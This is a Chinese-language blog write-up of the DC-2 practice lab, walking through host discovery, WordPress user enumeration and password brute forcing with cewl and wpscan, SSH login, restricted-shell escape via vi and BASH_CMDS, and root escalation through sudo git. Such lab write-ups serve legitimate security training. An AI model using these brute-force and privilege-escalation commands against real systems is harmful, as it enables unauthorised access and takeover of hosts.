<hr>
<h2 id="title-DC-2靶场记录date-2022-03-20-18-32-59tags-DC靶场typora-root-url"><a href="#title-DC-2靶场记录date-2022-03-20-18-32-59tags-DC靶场typora-root-url" class="headerlink" title="title: DC-2靶场记录date: 2022-03-20 18:32:59tags: DC靶场typora-root-url: .&#x2F;.."></a>title: DC-2靶场记录<br>date: 2022-03-20 18:32:59<br>tags: DC靶场<br>typora-root-url: .&#x2F;..</h2><h2 id="DC2靶场渗透"><a href="#DC2靶场渗透" class="headerlink" title="DC2靶场渗透"></a>DC2靶场渗透</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p>查找存活主机</p>
<pre><code>arp-scan -l
</code></pre>
<p><img src="/imgs/$%7Bfiilename%7D/Image-1715682913742-6.png" alt="Image"></p>
<p>得到DC-2的IP地址为：192.168.228.133</p>
<p>用nmap扫描开放的端口</p>
<pre><code>nmap -sV -p- 192.168.228.133
</code></pre>
<p><img src="/imgs/$%7Bfiilename%7D/Image-1715682922644-8.png" alt="Image"></p>
<p>可以看到DC-2开启了80端口，和ssh，ssh的端口在7744端口。</p>
<h3 id="2、渗透过程"><a href="#2、渗透过程" class="headerlink" title="2、渗透过程"></a>2、渗透过程</h3><p>直接去访问这个IP，发现访问不了。会自动跳转到DC-2，应该是给重定向了，本地DNS绑定一下</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240514183601795.png" alt="image-20240514183601795"></p>
<p>vim &#x2F;etc&#x2F;hosts</p>
<p>添加</p>
<p>192.168.228.133  DC-2</p>
<p><img src="/imgs/$%7Bfiilename%7D/Image-1715682990499-10.png" alt="Image"></p>
<p>保存退出，我们就可以正常访问到网页了。</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240514183654770.png" alt="image-20240514183654770"></p>
<p>提示是让我们用cewl</p>
<p>Cewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。</p>
<pre><code class="shell">cewl http://dc-2 -w passwd.txt
</code></pre>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240514183808157.png" alt="image-20240514183808157"></p>
<p>有了密码字典，还需要找登陆账号，和登陆界面</p>
<p>登陆界面就要挖目录去看看了，可以用dirb来挖目录</p>
<pre><code>dirb http://dc-2
</code></pre>
<p><img src="/imgs/$%7Bfiilename%7D/image-20240514183845652.png" alt="image-20240514183845652"></p>
<p>访问是一个登录的页面，找到了登录界面，接下来就是找登陆密码了。我们可以看到网站是wordpress.</p>
<p>wordpress有一个著名的扫描工具wpscan</p>
<pre><code>wpscan --url http://dc-2/ -e u   //枚举用户名字
</code></pre>
<p><img src="/imgs/$%7Bfiilename%7D/Image-1715683183030-12.png" alt="Image"></p>
<p><img src="/imgs/$%7Bfiilename%7D/Image-1715683196440-14.png" alt="Image"></p>
<p>找到了三个用户名，admin,jerry,tom,我们把这三个用户名写到一个文本user.txt里面</p>
<p>使用wpscan爆破账号密码</p>
<pre><code>wpscan --url http://dc-2/ -U user.txt -P passwd.txt
</code></pre>
<p><img src="/imgs/$%7Bfiilename%7D/Image-1715683235724-16.png" alt="Image"></p>
<p>找到了jerry,和tom的密码我们去网页登录,进去之后找到第二个flag</p>
<p><img src="/imgs/$%7Bfiilename%7D/Image-1715683274843-18.png" alt="Image"></p>
<p>flag2说我们在wordpress里面找不到其他东西了</p>
<p>最开始我们在前面发现他开启了ssh，然后我们还一个账号和密码，尝试用ssh登录</p>
<pre><code>ssh tom@192.168.228.133 -p 7744
</code></pre>
<p><img src="/imgs/$%7Bfiilename%7D/Image-1715683293210-20.png" alt="Image"></p>
<h3 id="三、提权"><a href="#三、提权" class="headerlink" title="三、提权"></a>三、提权</h3><p>登陆进去之后我们可以看到flag3.txt，但是cat用不了，查看可以用的命令</p>
<pre><code>compgen -c    //查看可以使用的指令
</code></pre>
<p><img src="/imgs/$%7Bfiilename%7D/Image-1715683327164-22.png" alt="Image"></p>
<p>vi可以用，用vi编辑器打开</p>
<p><img src="/imgs/$%7Bfiilename%7D/Image-1715683348407-24.png" alt="Image"></p>
<p>提到了tom和jerry，还有su，应该是让我们提权，vi可以用，有一个vi提权。这个需要在非编辑模式下进行。</p>
<p>vi随便打开文件</p>
<p>再下面添加</p>
<pre><code>:set shell=/bin/sh

:shell
</code></pre>
<p><img src="/imgs/$%7Bfiilename%7D/Image-1715683373698-26.png" alt="Image"></p>
<p>然后再输入：shell回车初步提权就成功了</p>
<p><img src="/imgs/$%7Bfiilename%7D/Image-1715683409753-28.png" alt="Image"></p>
<p>返回上一级目录，看到有一个jerry目录，进去看一下，有flag4。</p>
<p><img src="/imgs/$%7Bfiilename%7D/Image-1715683472024-30.png" alt="Image"><img src="/imgs/$%7Bfiilename%7D/Image-1715683478717-32.png" alt="Image"></p>
<p>cat用不了，还是用vi去查看flag，这里提示我们还没有回家，flag3里面提示我们su,我们可以尝试切换用户</p>
<p><img src="/imgs/$%7Bfiilename%7D/Image-1715683502575-34.png" alt="Image"></p>
<p>尝试切换jerry用户，切换不了</p>
<p>还需要提权，有一个-rbash环境变量提权的方法</p>
<pre><code>export -p    //查看环境变量

BASH_CMDS[a]=/bin/sh;a     //把/bin/sh给a

/bin/bash

export PATH=$PATH:/bin/     //添加环境变量

export PATH=$PATH:/usr/bin   //添加环境变量
</code></pre>
<p><img src="/imgs/$%7Bfiilename%7D/Image-1715683580053-36.png" alt="Image"></p>
<p>切换到到jerry用户成功</p>
<p>但是还是进不了root，找查具有SUID权限的可执行二进制文件</p>
<pre><code>find / -perm -u=s -type f 2&gt;/dev/null
</code></pre>
<p><img src="/imgs/$%7Bfiilename%7D/Image-1715683597376-38.png" alt="Image"></p>
<p>发现有一个sudo，用sudo -l看看sudo有什么权限</p>
<p><img src="/imgs/$%7Bfiilename%7D/Image-1715683622368-40.png" alt="Image"></p>
<p>git是root权限，使用git提权</p>
<pre><code>1、sudo git help config #在末行命令模式输入

!/bin/bash 或 !&#39;sh&#39; #完成提权

2、sudo git -p help

!/bin/bash #输入!/bin/bash，即可打开一个用户为root的shell
</code></pre>
<p><img src="/imgs/$%7Bfiilename%7D/Image-1715683664638-42.png" alt="Image"></p>
<p>提权成功</p>
